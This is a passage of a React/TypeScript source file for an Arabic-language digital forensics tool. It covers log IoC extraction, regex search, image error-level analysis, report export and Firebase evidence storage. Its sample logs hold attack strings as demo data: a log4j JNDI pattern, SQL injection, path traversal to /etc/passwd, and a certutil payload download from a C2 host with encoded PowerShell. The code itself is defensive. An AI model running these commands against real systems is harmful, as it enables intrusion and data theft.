2026-11-13T22:15:31.002Z nginx-error [CRITICAL] ModSecurity: Access denied with code 403 (phase 2). Matched "Operator \`Rx' with \`jndi:(?:ldap|rmi|dns):/' against REQUEST_URI. Target vulnerability: CVE-2021-44228. Client: 185.220.101.45.
2026-11-13T22:16:01.889Z snort[1942]: [1:2034334:2] ET EXPLOIT Apache log4j RCE Attempt (CVE-2021-44228) [Classification: Attempted Administrator Privilege Gain] [Priority: 1]: {TCP} 185.220.101.45:49152 -> 192.168.1.100:80
2026-11-13T22:16:15.334Z iptables: IN=eth0 OUT= MAC=00:16:3e:fb:4a:12 SRC=185.220.101.45 DST=192.168.1.100 PROTO=TCP SPT=49152 DPT=80 FLAGS=ACK`,

    sqli: `2026-11-13T21:40:12.441Z [SECURITY_AUDIT] Client 45.154.255.89 sent suspicious query string: /api/v1/users?id=1' UNION SELECT null,username,password,credit_card FROM information_schema.tables WHERE '1'='1--
2026-11-13T21:40:18.991Z [WAF_BLOCK] Suspicious file probe from 45.154.255.89: GET /static/../../../../../../etc/passwd HTTP/1.1
2026-11-13T21:40:44.200Z [WAF_BLOCK] Path traversal detected: GET /admin/preview?doc=c:\\windows\\win.ini HTTP/1.1
2026-11-13T21:41:05.112Z [APP_EXCEPTION] Database syntax error detected near "UNION SELECT null,username" triggered by session auth token hash: 9e107d9d372bb6826bd81d3542a419d6`,

    c2: `2026-11-13T20:05:14.331Z win-sysmon Event ID 1: Process Create (Image: C:\\Windows\\System32\\certutil.exe, CommandLine: certutil.exe -urlcache -split -f hxxp://malicious-gateway[.]io/payload.bin C:\\Users\\Public\\payload.exe)
2026-11-13T20:05:16.882Z win-sysmon Event ID 7: Image Loaded (Hashes: SHA256=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855, MD5=d41d8cd98f00b204e9800998ecf8427e, SHA1=da39a3ee5e6b4b0d3255bfef95601890afd80709)
2026-11-13T20:06:00.120Z win-sysmon Event ID 3: Network Connection to C2 Host (DestinationIp: 103.235.46.39, DestinationPort: 443, DestinationHostname: beacon-stage.shadow-infra.top)
2026-11-13T20:07:22.001Z win-sysmon Event ID 1: Process Create (Image: C:\\Windows\\System32\\cmd.exe, CommandLine: cmd.exe /c powershell -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA= ; whoami)
2026-11-13T20:07:40.511Z win-sysmon Event ID 13: Registry Value Set HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater (admin@shadow-infra.top)`
  };

  const parseLogsAndExtractIoCs = (rawText: string, sourceLabel: string = 'إدخال سجل مباشر') => {
    if (!rawText.trim()) return;
    setIsParsingLogs(true);
    try {
      const { iocs, stats } = extractIoCsFromLogs(rawText);
      setParsedIoCs(iocs);
      setLogParserStats(stats);
      setActiveIoCFilter('all');
      const totalIps = stats.ipv4 + stats.ipv6;
      const sampleIps = iocs
        .filter(i => i.type === 'ipv4' || i.type === 'ipv6')
        .slice(0, 5)
        .map(i => i.value)
        .join(', ');
      saveAuditLog({
        id: 'ioc-' + Math.random().toString(36).substring(2, 9),
        timestamp: new Date().toISOString(),
        fileName: `تحليل IoCs: ${sourceLabel}`,
        fileSize: `${rawText.length} حرف`,
        verdict: `استخراج ${stats.total} مؤشر اختراق (${stats.critical} حرج)`,
        score: stats.critical > 0 ? 35 : stats.high > 0 ? 65 : 92,
        risk: stats.critical > 0 ? 'حرج' : stats.high > 0 ? 'مرتفع' : 'منخفض',
        type: 'clipboard',
        sha256: 'REGEX-IOC-SCAN'
      }, { fileSizeRaw: rawText.length, aiProbability: stats.critical > 0 ? 85 : 20 });

      recordCustodyLedgerBlock(
        `ioc-scan-${Date.now()}`,
        'LOG_ANALYSIS',
        `تحليل سجلات واستخراج ${stats.total} مؤشر اختراق (${sourceLabel})`,
        'محلل السجلات الذكي (RegEx IoC Extractor)',
        `عناوين IP: ${totalIps}${sampleIps ? ` (${sampleIps})` : ''} | مؤشرات حرجة: ${stats.critical} | روابط/نطاقات: ${stats.url + stats.domain}`
      );
      notifyStatus(`تم تحليل السجل واستخراج ${stats.total} مؤشر اختراق (${totalIps} عنوان IP) وتوثيق العملية في سلسلة الحفظ.`, 'success');
    } finally {
      setIsParsingLogs(false);
    }
  };

  const exportIoCs = (format: 'json' | 'csv') => {
    if (parsedIoCs.length === 0) return;
    let content = '';
    let mime = 'application/json';
    let ext = 'json';
    if (format === 'json') {
      content = JSON.stringify({ extractedAt: new Date().toISOString(), stats: logParserStats, iocs: parsedIoCs }, null, 2);
    } else {
      const header = 'Type,Severity,Value,Occurrences,Lines,Details';
      const rows = parsedIoCs.map(i =>
        `"${i.type}","${i.severity}","${i.value.replace(/"/g, '""')}",${i.occurrences},"${i.lines.join(';')}","${i.details.replace(/"/g, '""')}"`
      );
      content = [header, ...rows].join('\n');
      mime = 'text/csv;charset=utf-8';
      ext = 'csv';
    }
    const blob = new Blob([content], { type: mime });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `sovereign_iocs_${Date.now()}.${ext}`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const runCustomRegex = (patternInput: string = customRegexPattern, flagsInput: string = customRegexFlags, textInput: string = logInputText) => {
    if (!patternInput.trim()) {
      setCustomRegexError('يرجى إدخال تعبير نمطي (RegEx) صحيح.');
      setCustomRegexMatches([]);
      return;
    }
    const regexSafety = isRegexSafe(patternInput);
    if (!regexSafety.safe) {
      setCustomRegexError(regexSafety.reason || 'تعبير نمطي غير آمن.');
      setCustomRegexMatches([]);
      void reportClientSecurityEvent({
        eventType: 'SUSPICIOUS_INPUT',
        detail: 'Blocked potentially catastrophic ReDoS regular expression in Log Parser',
      });
      return;
    }
    if (!textInput.trim()) {
      setCustomRegexError('لا يوجد نص سجلات للفحص. ألصق سجلات أو اختر عينة أولاً.');
      setCustomRegexMatches([]);
      return;
    }
    try {
      const cleanFlags = Array.from(new Set((flagsInput || 'g').replace(/[^gimsuy]/g, '').split('').concat(['g']))).join('');
      const re = new RegExp(patternInput, cleanFlags);
      const lines = textInput.split(/\r?\n/);
      const matches: { value: string; line: number }[] = [];

      for (let i = 0; i < lines.length; i++) {
        const lineStr = lines[i];
        re.lastIndex = 0;
        let m: RegExpExecArray | null;
        let safety = 0;
        while ((m = re.exec(lineStr)) !== null && safety < 100) {
          safety++;
          if (m[0]) {
            matches.push({ value: m[0], line: i + 1 });
          }
          if (m[0].length === 0) re.lastIndex++;
          if (matches.length >= 250) break;
        }
        if (matches.length >= 250) break;
      }
      setCustomRegexError(null);
      setCustomRegexMatches(matches);
    } catch (err: any) {
      setCustomRegexError(err?.message || 'صيغة التعبير النمطي غير صالحة');
      setCustomRegexMatches([]);
    }
  };

  const parseRealExif = (buffer: ArrayBuffer): ExifData => {
    return parseFullExifMetadata(buffer);
  };

  const calculateRealLaplacianVariance = (imgElement: HTMLImageElement): Promise<{ variance: number; noise: number; downscaledUrl: string }> => {
    return new Promise((resolve) => {
      const timer = setTimeout(() => {
        resolve({ variance: 1500, noise: 2.1, downscaledUrl: imgElement.src });
      }, 2500);

      try {
        const canvas = document.createElement('canvas');
        canvas.width = 300;
        canvas.height = 300;

        const ctx = canvas.getContext('2d', { willReadFrequently: true });
        if (!ctx) {
          clearTimeout(timer);
          resolve({ variance: 0, noise: 0, downscaledUrl: imgElement.src });
          return;
        }

        ctx.drawImage(imgElement, 0, 0, 300, 300);
        const downscaledUrl = canvas.toDataURL('image/jpeg', 0.85);

        const imgData = ctx.getImageData(0, 0, 300, 300);
        const data = imgData.data;

        const gray = new Float32Array(300 * 300);
        for (let i = 0; i < data.length; i += 4) {
          gray[i / 4] = 0.299 * data[i] + 0.587 * data[i + 1] + 0.114 * data[i + 2];
        }

        const laplacianValues: number[] = [];
        let sum = 0;
        const width = 300;
        const height = 300;

        for (let y = 1; y < height - 1; y++) {
          for (let x = 1; x < width - 1; x++) {
            const idx = y * width + x;
            const val = 
              gray[idx - width] + 
              gray[idx - 1] - 
              (4 * gray[idx]) + 
              gray[idx + 1] + 
              gray[idx + width];
            
            laplacianValues.push(val);
            sum += val;
          }
        }

        const n = laplacianValues.length;
        const mean = n > 0 ? sum / n : 0;

        let squaredDiffSum = 0;
        for (let i = 0; i < n; i++) {
          squaredDiffSum += Math.pow(laplacianValues[i] - mean, 2);
        }
        const variance = n > 0 ? squaredDiffSum / n : 0;
        const noise = Math.round(Math.sqrt(variance) * 0.05 * 100) / 100;

        clearTimeout(timer);
        resolve({ variance: Math.round(variance * 100) / 100, noise, downscaledUrl });
      } catch (e) {
        clearTimeout(timer);
        resolve({ variance: 0, noise: 0, downscaledUrl: imgElement.src });
      }
    });
  };

  const getElaUrlForMode = (res: ElaAnalysisResult, mode: 'heatmap' | 'rgb' | 'grayscale') => {
    if (mode === 'heatmap') return res.heatmapDataUrl;
    if (mode === 'grayscale') return res.grayscaleDataUrl;
    return res.rgbDataUrl;
  };

  const generateRealELA = async (
    imgElement: HTMLImageElement,
    amplification: number,
    qualityPct: number = elaQuality,
    mode: 'heatmap' | 'rgb' | 'grayscale' = elaMode
  ): Promise<{ url: string; result: ElaAnalysisResult }> => {
    const result = await runCanvasElaAnalysis(imgElement, amplification, qualityPct / 100);
    setElaMetrics(result);
    return { url: getElaUrlForMode(result, mode), result };
  };

  const regenerateElaWithConfig = async (
    newScale: number = elaSlider,
    newQualityPct: number = elaQuality,
    newMode: 'heatmap' | 'rgb' | 'grayscale' = elaMode
  ) => {
    setElaSlider(newScale);
    setElaQuality(newQualityPct);
    setElaMode(newMode);

    // If only changing visualization mode with identical scale & quality, switch immediately from Canvas outputs
    if (
      elaMetrics &&
      elaMetrics.amplification === newScale &&
      Math.round(elaMetrics.jpegQuality * 100) === newQualityPct
    ) {
      setElaImage(getElaUrlForMode(elaMetrics, newMode));
      return;
    }

    if (!selectedImage) return;
    const img = new Image();
    if (!selectedImage.startsWith('blob:') && !selectedImage.startsWith('data:')) {
      img.crossOrigin = 'anonymous';
    }
    img.onload = async () => {
      const { url } = await generateRealELA(img, newScale, newQualityPct, newMode);
      setElaImage(url);
    };
    img.src = selectedImage;
  };

  const buildReportDossierPayload = (targetEvidence?: Evidence[]): ForensicDossierInput => {
    const items = targetEvidence || (
      reportSelectedEvidenceIds.length > 0
        ? evidenceList.filter(e => reportSelectedEvidenceIds.includes(e.id))
        : evidenceList.filter(e => !currentInvestigationId || e.investigationId === currentInvestigationId)
    );
    const activeInv = investigations.find(i => i.id === currentInvestigationId);
    const examiner = (reportExaminerName.trim() || userProfile?.displayName || user?.displayName || 'كبير المحققين السياديين');
    return {
      caseNumber: reportCaseNumber.trim() || `SOV-CASE-${Date.now()}`,
      title: reportTitle.trim() || 'التقرير الجنائي الرقمي الموحد',
      classification: reportClassification,
      examinerName: examiner,
      examinerEmail: userProfile?.email || user?.email || 'analyst@sovereign.forensic',
      department: reportDepartment.trim() || 'مختبر الأدلة الرقمية السيادي',
      investigationTitle: activeInv?.title || 'التحقيق السيادي المركزي - الأدلة الرقمية',
      summary: reportSummary.trim(),
      generatedAt: new Date().toISOString(),
      evidenceItems: items,
      custodyEntries: globalCustodyLedger,
      custodyChainVerified: globalLedgerVerification.verified,
      iocs: parsedIoCs,
      includeEvidenceHashes: reportIncludeEvidenceHashes,
      includeExifEla: reportIncludeExifEla,
      includeCustodyChain: reportIncludeCustodyChain,
      includeIoCs: reportIncludeIoCs,
    };
  };

  const handleExportOfficialReport = async (format: 'html' | 'json' | 'csv') => {
    const activeItems = reportSelectedEvidenceIds.length > 0
      ? evidenceList.filter(e => reportSelectedEvidenceIds.includes(e.id))
      : evidenceList.filter(e => !currentInvestigationId || e.investigationId === currentInvestigationId);

    if (activeItems.length === 0) {
      notifyStatus('لا توجد أدلة محددة للتصدير. يرجى رفع دليل أو تحديد دليل من القائمة أولاً.', 'warning');
      return;
    }

    setIsGeneratingReport(true);
    try {
      const dossier = buildReportDossierPayload(activeItems);
      const sealSha256 = await computeReportSealSha256(dossier);
      setReportLastSealSha256(sealSha256);

      let content = '';
      let mime = 'text/html;charset=utf-8';
      let ext = 'html';

      if (format === 'html') {
        content = generateOfficialHtmlReport(dossier, sealSha256);
        mime = 'text/html;charset=utf-8';
        ext = 'html';
      } else if (format === 'json') {
        content = generateOfficialJsonDossier(dossier, sealSha256);
        mime = 'application/json;charset=utf-8';
        ext = 'json';
      } else {
        content = generateOfficialCsvManifest(dossier, sealSha256);
        mime = 'text/csv;charset=utf-8';
        ext = 'csv';
      }

      // Download official report file
      const blob = new Blob([content], { type: mime });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `Sovereign_Forensic_Report_${dossier.caseNumber.replace(/[^a-zA-Z0-9_-]/g, '_')}.${ext}`;
      a.click();
      URL.revokeObjectURL(url);

      // Persist immutable report attestation to Firestore
      const activeUid = auth.currentUser?.uid || user?.uid || 'local-analyst';
      const firestorePayload = {
        userId: activeUid,
        investigationId: (currentInvestigationId || 'inv-sovereign-default').slice(0, 128),
        caseNumber: dossier.caseNumber.slice(0, 64),
        title: dossier.title.slice(0, 256),
        classification: dossier.classification,
        examinerName: dossier.examinerName.slice(0, 128),
        department: dossier.department.slice(0, 128),
        summary: dossier.summary.slice(0, 2048),
        evidenceCount: activeItems.length,
        evidenceSha256List: activeItems.slice(0, 100).map(ev => ev.sha256),
        iocCount: parsedIoCs.length,
        custodyCount: globalCustodyLedger.length,
        reportSealSha256: sealSha256,
        exportFormat: format.toUpperCase(),
        createdAt: dossier.generatedAt,
      };

      let reportDocId = `rpt-${Date.now()}`;
      let synced = false;
      if (auth.currentUser) {
        try {
          const refDoc = await addDoc(collection(db, 'forensic_reports'), firestorePayload);
          reportDocId = refDoc.id;
          synced = true;
        } catch (dbErr) {
          console.error('Forensic report Firestore write error:', dbErr);
          handleFirestoreError(dbErr, OperationType.CREATE, 'forensic_reports');
        }
      }

      const savedEntry: SavedForensicReport = { id: reportDocId, ...firestorePayload, synced };
      setSavedReports(prev => {
        const next = [savedEntry, ...prev.filter(r => r.id !== reportDocId)];
        try {
          localStorage.setItem('sovereign_forensic_reports', JSON.stringify(next.slice(0, 50)));
        } catch (_) {}
        return next;
      });

      await recordCustodyLedgerBlock(
        reportDocId,
        'REPORT_EXPORT',
        `تصدير وختم تقرير جنائي رسمي (${format.toUpperCase()} — ${dossier.caseNumber})`,
        'مركز التقارير الجنائية الموثقة',
        `عدد الأدلة: ${activeItems.length} | ختم التقرير SHA-256: ${sealSha256}`
      );

      notifyStatus(`تم تصدير التقرير الجنائي الموثق (${format.toUpperCase()}) وختمه ببصمة SHA-256 بنجاح.`, 'success');
    } catch (err: any) {
      console.error('Export official report error:', err);
      notifyStatus('حدث خطأ أثناء توليد أو حفظ التقرير الرسمي.', 'error');
    } finally {
      setIsGeneratingReport(false);
    }
  };

  const loadSampleExifGpsImage = async () => {
    setIsAnalyzing(true);
    try {
      const canvas = document.createElement('canvas');
      canvas.width = 640;
      canvas.height = 420;
      const ctx = canvas.getContext('2d');
      if (!ctx) {
        setIsAnalyzing(false);
        return;
      }
      const grad = ctx.createLinearGradient(0, 0, 640, 420);
      grad.addColorStop(0, '#0f172a');
      grad.addColorStop(1, '#1e293b');
      ctx.fillStyle = grad;
      ctx.fillRect(0, 0, 640, 420);
      ctx.strokeStyle = '#D4AF37';
      ctx.lineWidth = 3;
      ctx.strokeRect(24, 24, 592, 372);
      ctx.fillStyle = '#D4AF37';
      ctx.font = 'bold 22px monospace';
      ctx.fillText('FORENSIC FIELD EVIDENCE #SOC-GPS', 50, 80);
      ctx.fillStyle = '#e2e8f0';
      ctx.font = '16px monospace';
      ctx.fillText('CAMERA: SONY ILCE-7RM5 | FE 35mm F1.4 GM', 50, 140);
      ctx.fillText('CAPTURE: 2026:11:13 14:22:09', 50, 180);
      ctx.fillStyle = '#34d399';
      ctx.fillText('GPS: 24° 42\' 48.9" N, 46° 40\' 31.1" E (RIYADH)', 50, 220);

      // Add subtle spliced square to demonstrate real ELA difference
      ctx.fillStyle = '#dc2626';
      ctx.fillRect(420, 250, 150, 90);
      ctx.fillStyle = '#ffffff';
      ctx.font = 'bold 14px monospace';
      ctx.fillText('STAMPED', 455, 300);

      const baseBlob = await new Promise<Blob | null>(res => canvas.toBlob(res, 'image/jpeg', 0.92));
      if (!baseBlob) {
        setIsAnalyzing(false);
        return;
      }
      const rawJpeg = new Uint8Array(await baseBlob.arrayBuffer());
      const withExifBytes = injectRealExifGpsIntoJpeg(rawJpeg, {
        make: 'SONY',
        model: 'ILCE-7RM5',
        software: 'Sovereign Evidence Cam v2.5',
        dateTimeOriginal: '2026:11:13 14:22:09',
        latitude: 24.713583,
        longitude: 46.675306,
        altitude: 612,
      });

      const enrichedBlob = new Blob([withExifBytes], { type: 'image/jpeg' });
      const dataUrl = URL.createObjectURL(enrichedBlob);
      const sampleName = 'field_capture_exif_gps.jpg';
      setImageName(sampleName);
      await processImageFile(
        dataUrl,
        sampleName,
        withExifBytes.byteLength,
        formatFileSize(withExifBytes.byteLength),
        new Date().toISOString(),
        'image/jpeg',
        withExifBytes
      );
      notifyStatus('تم تحميل صورة ميدانية حقيقية تحتوي على ترويسة EXIF وبيانات GPS مدمجة.', 'success');
    } catch (err) {
      console.error('EXIF sample error:', err);
      setIsAnalyzing(false);
    }
  };

  const loadSampleImage = (type: 'authentic' | 'deepfake' | 'manipulated') => {
    setIsAnalyzing(true);
    const canvas = document.createElement('canvas');
    canvas.width = 600;
    canvas.height = 600;
    const ctx = canvas.getContext('2d');
    if (!ctx) {
      setIsAnalyzing(false);
      return;
    }

    if (type === 'authentic') {
      ctx.fillStyle = '#1e3a8a';
      ctx.fillRect(0, 0, 600, 600);
      ctx.fillStyle = '#ffffff';
      ctx.font = '24px sans-serif';
      ctx.fillText('عينة صورة حقيقية (DSLR)', 40, 60);
    } else if (type === 'deepfake') {
      ctx.fillStyle = '#4c1d95';
      ctx.fillRect(0, 0, 600, 600);
      ctx.fillStyle = '#f3f4f6';
      ctx.font = '24px sans-serif';
      ctx.fillText('عينة تزييف رقمي (Synthetic Pattern)', 40, 60);
    } else {
      ctx.fillStyle = '#f8fafc';
      ctx.fillRect(0, 0, 600, 600);
      ctx.fillStyle = '#ef4444';
      ctx.fillRect(50, 150, 500, 80);
      ctx.fillStyle = '#ffffff';
      ctx.font = '24px sans-serif';
      ctx.fillText('مستند مالي معدل (Spliced)', 70, 200);
    }

    const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
    const sampleName = type === 'authentic' ? 'sample_authentic.jpg' : type === 'deepfake' ? 'sample_deepfake.jpg' : 'sample_spliced.jpg';
    setImageName(sampleName);
    
    fetch(dataUrl)
      .then(res => res.arrayBuffer())
      .then(buffer => {
        const lastModified = new Date().toLocaleString('ar-SA');
        processImageFile(dataUrl, sampleName, buffer.byteLength, `${(buffer.byteLength / 1024).toFixed(2)} KB`, lastModified, 'image/jpeg', buffer);
      })
      .catch((err) => {
        console.error('Sample image error:', err);
        setIsAnalyzing(false);
      });
  };

  const uploadFileToFirebaseStorage = async (
    fileData: Blob | Uint8Array | ArrayBuffer,
    fileName: string,
    mimeType: string,
    customMetadata: Record<string, string> = {}
  ): Promise<{ downloadUrl: string; storagePath: string }> => {
    if (!auth.currentUser) {
      throw new Error('Firebase Auth required for cloud storage');
    }

    const totalSize = fileData instanceof Blob ? fileData.size : fileData.byteLength;
    if (totalSize > 25 * 1024 * 1024) {
      throw new Error('حجم الدليل يتجاوز الحد الأمني لـ Firebase Storage (25 MB).');
    }

    const sanitizedName = fileName.replace(/[^a-zA-Z0-9._-]/g, '_').slice(0, 120);
    const storagePath = `evidence/${auth.currentUser.uid}/${currentInvestigationId || 'default'}/${Date.now()}_${sanitizedName}`;
    const fileRef = ref(storage, storagePath);

    setStorageUploadState({
      active: true,
      fileName,
      progress: 5,
      bytesTransferred: 0,
      totalBytes: totalSize,
      status: 'uploading',
      message: 'جاري الرفع المشفر إلى Firebase Storage...'
    });

    const uploadTask = uploadBytesResumable(fileRef, fileData, {
      contentType: mimeType || 'application/octet-stream',
      customMetadata
    });

    return await new Promise<{ downloadUrl: string; storagePath: string }>((resolve, reject) => {
      const timeoutId = setTimeout(() => {
        try {
          uploadTask.cancel();
        } catch (_) {}
        setStorageUploadState(prev => ({
          ...prev,
          active: false,
          status: 'error',
          message: 'انتهت مهلة الاتصال بخادم Firebase Storage'
        }));
        reject(new Error('Storage upload timeout'));
      }, 30000);

      uploadTask.on(
        'state_changed',
        (snapshot) => {
          const pct = snapshot.totalBytes > 0
            ? Math.round((snapshot.bytesTransferred / snapshot.totalBytes) * 100)
            : 50;
          setStorageUploadState({
            active: true,
            fileName,
            progress: pct,
            bytesTransferred: snapshot.bytesTransferred,
            totalBytes: snapshot.totalBytes,
            status: 'uploading',
            message: `جاري رفع الدليل إلى Firebase Storage (${pct}%)...`
          });
        },
        (error) => {
          clearTimeout(timeoutId);
          setStorageUploadState({
            active: false,
            fileName,
            progress: 0,
            bytesTransferred: 0,
            totalBytes: totalSize,
            status: 'error',
            message: error.message || 'تعذر الرفع إلى Firebase Storage'
          });
          reject(error);
        },
        async () => {
          clearTimeout(timeoutId);
          try {
            const downloadUrl = await getDownloadURL(uploadTask.snapshot.ref);
            setStorageUploadState({
              active: false,
              fileName,
              progress: 100,
              bytesTransferred: totalSize,
              totalBytes: totalSize,
              status: 'done',
              message: 'تم حفظ الدليل في Firebase Storage وتوثيقه في Firestore بنجاح.'
            });
            resolve({ downloadUrl, storagePath });
          } catch (urlErr) {
            reject(urlErr);
          }
        }
      );
    });
  };

  const sanitizeForFirestore = (val: any): any => {
    if (Array.isArray(val)) return val.map(sanitizeForFirestore);
    if (val && typeof val === 'object') {
      const out: Record<string, any> = {};
      for (const [k, v] of Object.entries(val)) {
        if (v !== undefined) out[k] = sanitizeForFirestore(v);
      }
      return out;
    }
    return val;
  };

  const saveEvidenceToCloud = async (
    name: string,
    sizeBytes: number,
    mimeType: string,
    sha256: string,
    sha1: string,
    sha512: string,
    md5: string,
    result: ForensicResult,
    rawBuffer: ArrayBuffer,
    previewUrl: string
  ): Promise<{ evidenceId: string; fileUrl: string; storagePath?: string; storageStatus: 'cloud' | 'local' } | undefined> => {
    const activeUid = auth.currentUser?.uid || user?.uid;
    if (!activeUid) return undefined;
    try {
      const blob = new Blob([rawBuffer], { type: mimeType || 'application/octet-stream' });
      localFilesCacheRef.current.set(sha256, { blob, name, mimeType });

      let evidenceDocId = 'ev-' + Date.now();
      const createdAtIso = new Date().toISOString();
      const safeAnalysis = sanitizeForFirestore(result);
      let downloadUrl = previewUrl;
      let storagePath: string | undefined;
      let storageStatus: 'cloud' | 'local' = 'local';

      const initialPersistedUrl = downloadUrl.startsWith('data:') && downloadUrl.length <= 50000 ? downloadUrl : '';

      // Step 1: Persist SHA-256 & Magic Bytes forensic metadata directly to Firestore immediately
      if (auth.currentUser) {
        try {
          const evidenceRef = await addDoc(collection(db, 'evidence'), {
            userId: auth.currentUser.uid,
            investigationId: currentInvestigationId || 'inv-sovereign-default',
            fileName: name,
            fileUrl: initialPersistedUrl,
            storagePath: '',
            storageStatus: 'local',
            fileSize: sizeBytes,
            mimeType,
            sha256,
            sha1,
            sha512,
            md5,
            analysis: safeAnalysis,
            createdAt: createdAtIso
          });
          evidenceDocId = evidenceRef.id;
        } catch (docErr) {
          console.error('Firestore evidence save error:', docErr);
          handleFirestoreError(docErr, OperationType.CREATE, 'evidence');
        }

        // Step 2: Upload binary file to Firebase Storage and update Firestore URL/status
        try {
          const uploaded = await uploadFileToFirebaseStorage(rawBuffer, name, mimeType, {
            sha256,
            sha1,
            md5,
            detectedFileType: result.detectedFileType,
            investigationId: currentInvestigationId || 'inv-sovereign-default'
          });
          downloadUrl = uploaded.downloadUrl;
          storagePath = uploaded.storagePath;
          storageStatus = 'cloud';
          try {
            await updateDoc(doc(db, 'evidence', evidenceDocId), {
              fileUrl: downloadUrl,
              storagePath,
              storageStatus: 'cloud'
            });
          } catch (updErr) {
            console.warn('Firestore storage URL update note:', updErr);
          }
        } catch (storageErr) {
          console.warn('Storage upload bypassed, Firestore SHA-256 & Magic Bytes saved:', storageErr);
        }
      }

      const persistedUrl = storageStatus === 'cloud' ? downloadUrl : initialPersistedUrl;

      const newEv: Evidence = {
        id: evidenceDocId,
        fileName: name,
        fileUrl: persistedUrl || downloadUrl,
        storagePath,
        storageStatus,
        fileSize: sizeBytes,
        mimeType,
        sha256,
        sha1,
        sha512,
        md5,
        investigationId: currentInvestigationId || 'inv-sovereign-default',
        userId: activeUid,
        analysis: safeAnalysis,
        createdAt: createdAtIso
      };

      setLastAnalyzedEvidenceId(evidenceDocId);
      setEvidenceList(prev => {
        const updated = [newEv, ...prev.filter(e => e.sha256 !== sha256 && e.id !== evidenceDocId)];
        try {
          localStorage.setItem('sovereign_evidence_local', JSON.stringify(updated.slice(0, 40).map(ev => ({
            ...ev,
            fileUrl: ev.fileUrl.startsWith('blob:') ? '' : ev.fileUrl
          }))));
        } catch (_) {}
        return updated;
      });

      await addToCustody(
        evidenceDocId, 
        storageStatus === 'cloud' ? `رفع دليل جديد وتوثيقه في Storage و Firestore (${name})` : `رفع وفحص دليل رقمي وحفظه في Firestore (${name})`,
        storageStatus === 'cloud' ? 'Firebase Cloud Storage + Firestore Ledger' : 'مختبر الأدلة الرقمية السيادي - قسم الأدلة',
        `SHA-256: ${sha256} | Magic Bytes: ${result.headerHex || ''} | الصيغة الحقيقية: ${result.detectedFileType}`,
        '',
        [],
        'EVIDENCE_UPLOAD'
      );

      return { evidenceId: evidenceDocId, fileUrl: newEv.fileUrl, storagePath, storageStatus };
    } catch (err) {
      console.warn('Background evidence sync note:', err);
      return undefined;
    }
  };

  const handleEvidenceVaultUpload = async (file: File) => {
    const fileName = file.name;
    const fileSize = file.size;
    const fileSizeFormatted = formatFileSize(fileSize);
    const mimeType = file.type || 'application/octet-stream';

    setStorageUploadState({
      active: true,
      fileName,
      progress: 10,
      bytesTransferred: 0,
      totalBytes: fileSize,
      status: 'hashing',
      message: 'جاري قراءة الـ Hex Bytes وحساب بصمة SHA-256 محلياً...'
    });

    try {
      const buffer = await file.arrayBuffer();
      const binaryInfo = await analyzeFileBinary(buffer, fileName, mimeType);
      const effectiveMime = binaryInfo.mimeTypeDetected || mimeType;
      const previewBlobUrl = effectiveMime.startsWith('image/') && !binaryInfo.isMasqueraded
        ? URL.createObjectURL(new Blob([buffer], { type: effectiveMime }))
        : '';

      localFilesCacheRef.current.set(binaryInfo.sha256, {
        blob: new Blob([buffer], { type: effectiveMime }),
        name: fileName,
        mimeType: effectiveMime
      });

      setEvidenceLocalInspection({
        fileName,
        fileSize,
        fileSizeFormatted,
        mimeType: effectiveMime,
        binary: binaryInfo,
        syncedToCloud: false
      });

      const aiProbability = binaryInfo.isMasqueraded ? 95 : (binaryInfo.entropy >= 7.2 ? 75 : 10);
      const authenticityScore = Math.max(1, Math.min(99, 100 - aiProbability));
      const verdict = binaryInfo.isMasqueraded
        ? 'تمويه خطير للملف (Masqueraded / Extension Spoofing)'
        : binaryInfo.entropy >= 7.2
        ? 'ملف مشفر أو مغلف ببرمجية ضغط/تشفير (Packed / High Entropy)'
        : 'ملف أصلي موثق الترويسة والبصمة (SHA-256 & Magic Bytes Verified)';
      const riskLevel = binaryInfo.isMasqueraded ? 'حرج' : binaryInfo.entropy >= 7.2 ? 'مرتفع' : 'منخفض';

      const indicators: string[] = [
        `ترويسة البايتات السحرية: ${binaryInfo.headerHex}`,
        `نوع الملف المكتشف: ${binaryInfo.detectedFileType}`,
        `إنتروبيا شانون: ${binaryInfo.entropy}/8.0 (${binaryInfo.entropyClassification})`
      ];
      if (binaryInfo.masqueradeWarning) {
        indicators.unshift(binaryInfo.masqueradeWarning);
      }

      const result: ForensicResult = {
        fileName,
        fileSize,
        fileSizeFormatted,
        lastModified: new Date(file.lastModified).toISOString(),
        mimeType: effectiveMime,
        width: 0,
        height: 0,
        sha256: binaryInfo.sha256,
        sha1: binaryInfo.sha1,
        sha512: binaryInfo.sha512,
        md5: binaryInfo.md5,
        hexBytes: binaryInfo.hexBytes,
        detectedFileType: binaryInfo.detectedFileType,
        expectedExtensions: binaryInfo.expectedExtensions,
        exif: parseRealExif(buffer),
        laplacianVariance: 0,
        sensorGrainNoise: 0,
        elaScore: 0,
        aiProbability,
        authenticityScore,
        verdict,
        riskLevel,
        localReport: {
          verdict,
          riskLevel,
          detailedReport: binaryInfo.masqueradeWarning || `تم فحص الملف محلياً وحساب البصمة التشفيرية SHA-256 (${binaryInfo.sha256}) وترويسة Hex (${binaryInfo.headerHex}).`,
          indicators
        },
        entropy: binaryInfo.entropy,
        entropyClassification: binaryInfo.entropyClassification,
        headerHex: binaryInfo.headerHex,
        headerAscii: binaryInfo.headerAscii,
        isMasqueraded: binaryInfo.isMasqueraded,
        masqueradeWarning: binaryInfo.masqueradeWarning
      };

      setAnalysisResult(result);
      setHexInspectorData({
        fileName,
        totalBytes: binaryInfo.totalByteLength || fileSize,
        bytes: binaryInfo.extendedHexBytes || binaryInfo.hexBytes,
        headerHex: binaryInfo.headerHex,
        headerAscii: binaryInfo.headerAscii,
        detectedFileType: binaryInfo.detectedFileType,
        expectedExtensions: binaryInfo.expectedExtensions,
        entropy: binaryInfo.entropy,
        entropyClassification: binaryInfo.entropyClassification,
        isMasqueraded: binaryInfo.isMasqueraded,
        masqueradeWarning: binaryInfo.masqueradeWarning,
      });
      setHexPageOffset(0);
      setHexSelectedByteIndex(null);
      setImageName(fileName);
      if (previewBlobUrl) setSelectedImage(previewBlobUrl);

      await saveAuditLog({
        id: 'ev-intake-' + Math.random().toString(36).substring(2, 9),
        timestamp: new Date().toISOString(),
